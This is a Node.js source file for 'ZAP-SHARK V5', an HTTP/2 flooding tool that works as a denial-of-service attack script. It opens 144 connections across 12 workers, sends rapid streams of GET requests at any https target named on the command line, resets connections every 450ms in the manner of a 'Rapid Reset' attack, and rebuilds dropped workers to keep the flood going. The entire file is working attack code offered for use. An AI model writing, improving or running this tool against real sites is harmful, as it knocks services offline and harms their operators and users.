const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V5_TOR {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // WORKER SYSTEM (NO CLUSTER)
        this.workers = [];
        this.workerCount = 12;
        this.workerConnections = 12; // 12 conns per worker
        this.totalConnections = this.workerCount * this.workerConnections; // 144 total
        
        // RAPID RESET - EXTREME
        this.lastConnectionReset = Date.now();
        this.resetInterval = 450; // 450ms RAPID RESET
        
        // MEMORY LIMITS
        this.maxMemoryMB = 400; // SAME AS V4
        this.lastMemoryCheck = Date.now();
        
        // PERFORMANCE TRACKING
        this.peakRPS = 0;
        this.totalPayload = 0;
        
        // INTERVALS
        this.attackInterval = null;
        this.workerInterval = null;
        this.displayInterval = null;
    }

    // === WORKER SYSTEM ===
    createWorker(id) {
        const worker = {
            id,
            connections: [],
            requestCount: 0,
            rps: 0,
            lastReset: Date.now()
        };
        
        // CREATE CONNECTIONS FOR THIS WORKER
        for (let i = 0; i < this.workerConnections; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 4096, // LOW MEMORY PER CONN
                    peerMaxConcurrentStreams: 100
                });
                
                client.setMaxListeners(50);
                client.on('error', () => {});
                
                worker.connections.push({
                    client,
                    requests: 0,
                    created: Date.now()
                });
                
            } catch (err) {
                // SILENT FAIL
            }
        }
        
        return worker;
    }

    initializeWorkers() {
        console.log('=== INITIALIZING 12 WORKERS ===');
        for (let i = 0; i < this.workerCount; i++) {
            const worker = this.createWorker(i);
            this.workers.push(worker);
            
            // STAGGER INITIALIZATION
            setTimeout(() => {
                console.log(`[+] Worker ${i+1}/12 ready`);
            }, i * 100);
        }
    }

    // === EXTREME RAPID RESET ===
    performRapidReset() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.resetInterval) {
            // RESET 1 WORKER PER CYCLE (ROUND ROBIN)
            const workerIndex = Math.floor(Math.random() * this.workers.length);
            const worker = this.workers[workerIndex];
            
            if (worker) {
                // RESET ALL CONNECTIONS IN THIS WORKER
                worker.connections.forEach(conn => {
                    try {
                        conn.client.destroy();
                        
                        // CREATE NEW CONNECTION
                        const newClient = http2.connect(this.targetUrl, {
                            maxSessionMemory: 4096
                        });
                        newClient.setMaxListeners(50);
                        newClient.on('error', () => {});
                        
                        conn.client = newClient;
                        conn.requests = 0;
                        conn.created = Date.now();
                        
                    } catch (err) {}
                });
                
                worker.lastReset = now;
            }
            
            this.lastConnectionReset = now;
        }
    }

    // === WORKER ATTACK ===
    workerAttack(worker) {
        if (!worker || worker.connections.length === 0) return 0;
        
        let requestsThisTick = 0;
        const streamsPerTick = 10; // 10 STREAMS PER TICK PER WORKER
        
        for (let i = 0; i < streamsPerTick; i++) {
            const conn = worker.connections[Math.floor(Math.random() * worker.connections.length)];
            if (!conn) continue;

            try {
                const req = conn.client.request({
                    ':method': 'GET',
                    ':path': '/',
                    ':authority': this.hostname
                });
                
                req.on('response', () => {
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    conn.requests++;
                    worker.requestCount++;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                    requestsThisTick++;
                });
                
                req.end();
                
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
                requestsThisTick++;
            }
        }
        
        return requestsThisTick;
    }

    // === MAIN ATTACK LOOP ===
    startAttackLoop() {
        // EACH WORKER ATTACKS INDEPENDENTLY
        this.workerInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                // ALL 12 WORKERS ATTACK SIMULTANEOUSLY
                this.workers.forEach(worker => {
                    this.workerAttack(worker);
                });
            }
        }, 0.1); // 100ms TICK FOR ALL WORKERS
    }

    // === MEMORY MANAGEMENT ===
    checkMemory() {
        const now = Date.now();
        if (now - this.lastMemoryCheck >= 10000) { // EVERY 10s
            const usedMB = process.memoryUsage().rss / 1024 / 1024;
            
            if (usedMB > this.maxMemoryMB) {
                // REDUCE AGGRESSION TEMPORARILY
                this.resetInterval = Math.min(2000, this.resetInterval + 100);
                console.log(`[!] Memory high: ${usedMB.toFixed(1)}MB - Slowing down`);
            } else if (usedMB < this.maxMemoryMB * 0.7) {
                // INCREASE AGGRESSION
                this.resetInterval = Math.max(200, this.resetInterval - 50);
            }
            
            this.lastMemoryCheck = now;
        }
    }

    // === OLD LOGGING SYSTEM ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtimeStr = this.formatRuntime();
        const activeWorkers = this.workers.filter(w => w.connections.length > 0).length;
        const totalConns = this.workers.reduce((sum, w) => sum + w.connections.length, 0);
        const usedMB = (process.memoryUsage().rss / 1024 / 1024).toFixed(1);
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK V5 | TØR — (${runtimeStr}) | STATUS: ${this.status}`);
        console.log('=================================');
        console.log(`SHARK-TRS — ${this.totalRequests.toLocaleString()}`);
        console.log(`SHARK-RPS — ${this.currentRPS.toFixed(1)}`);
        console.log(`SHARK-PEAK — ${this.peakRPS.toFixed(1)}`);
        console.log('=================================');
        console.log(`WORKERS: ${activeWorkers}/${this.workerCount}`);
        console.log(`CONNECTIONS: ${totalConns}/${this.totalConnections}`);
        console.log(`RESET: ${this.resetInterval}ms | MEM: ${usedMB}MB`);
        console.log('=================================');
    }

    // === MAIN ===
    start() {
        console.log('=== ZAP-SHARK V5 | TØR ===');
        console.log('Target:', this.targetUrl);
        console.log('Workers: 12 | Conns/Worker: 12');
        console.log('Total Connections: 144');
        console.log('Rapid Reset: 450ms');
        console.log('Max RSS: 400MB (same as V4)');
        console.log('='.repeat(50));
        
        this.initializeWorkers();
        
        setTimeout(() => {
            console.log('\n[+] ALL SYSTEMS READY - STARTING ATTACK');
            
            // MAIN SYSTEMS
            this.attackInterval = setInterval(() => {
                this.performRapidReset();
                this.checkMemory();
                this.updateDisplay();
            }, 100);
            
            this.startAttackLoop();
            
            // AUTO-RECOVERY
            setInterval(() => {
                // REBUILD DEAD WORKERS
                this.workers.forEach((worker, index) => {
                    const aliveConns = worker.connections.filter(conn => {
                        try {
                            return conn.client && !conn.client.destroyed;
                        } catch (err) {
                            return false;
                        }
                    }).length;
                    
                    if (aliveConns < this.workerConnections * 0.5) {
                        console.log(`[~] Rebuilding Worker ${index + 1}`);
                        worker.connections.forEach(conn => {
                            try { conn.client.destroy(); } catch (err) {}
                        });
                        
                        // REBUILD
                        for (let i = 0; i < this.workerConnections; i++) {
                            try {
                                const client = http2.connect(this.targetUrl, {
                                    maxSessionMemory: 4096
                                });
                                client.setMaxListeners(50);
                                client.on('error', () => {});
                                
                                worker.connections[i] = {
                                    client,
                                    requests: 0,
                                    created: Date.now()
                                };
                            } catch (err) {}
                        }
                    }
                });
            }, 30000); // CHECK EVERY 30s
            
        }, 5000); // WAIT 5s FOR INIT
        
        process.on('SIGINT', () => {
            console.log('\n\n=== ZAP-SHARK V5 FINAL STATS ===');
            console.log(`Total Runtime: ${this.formatRuntime()}`);
            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`Peak RPS: ${this.peakRPS.toFixed(1)}`);
            console.log(`Average RPS: ${(this.totalRequests / ((Date.now() - this.startTime) / 1000)).toFixed(1)}`);
            console.log('='.repeat(50));
            
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.workerInterval);
            clearInterval(this.displayInterval);
            
            this.workers.forEach(worker => {
                worker.connections.forEach(conn => {
                    try { conn.client.destroy(); } catch (err) {}
                });
            });
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v5.js https://target.com');
    process.exit(1);
}

// INCREASE MEMORY LIMIT FOR TERMUX
process.env.NODE_OPTIONS = '--max-old-space-size=4096';

const shark = new ZAPSHARK_V5_TOR(target);
shark.start();
